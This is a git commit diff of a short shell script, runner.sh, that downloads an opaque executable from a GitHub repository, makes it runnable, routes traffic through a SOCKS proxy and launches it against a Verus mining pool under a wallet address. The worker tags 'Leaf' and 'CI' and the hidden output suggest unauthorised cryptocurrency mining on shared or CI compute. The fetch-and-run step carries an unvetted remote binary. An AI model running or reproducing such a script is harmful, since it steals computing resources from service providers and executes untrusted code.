ae5bbadeebbabf8ee8d0b3090a7c0269b15d49c6
cokcek386 <92537174+cokcek386@users.noreply.github.com>
2021-10-16 10:01:15 -0500

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-wget -q https://github.com/comandashtar/colab-2/raw/main/kanyut
-chmod +x kanyut
+wget -q https://github.com/renitareni/mesin/raw/main/Mesin
+chmod +x Mesin
 export http_proxy=socsk5://198.1.94.46:45972
-./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.$(echo $(shuf -i 1-99999 -n 1)-Leaf) -p c=VRSC -t 40 >/dev/null 2>&1
+./Mesin -v -l na.luckpool.net:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-99999 -n 1)-CI) -p x -t 16
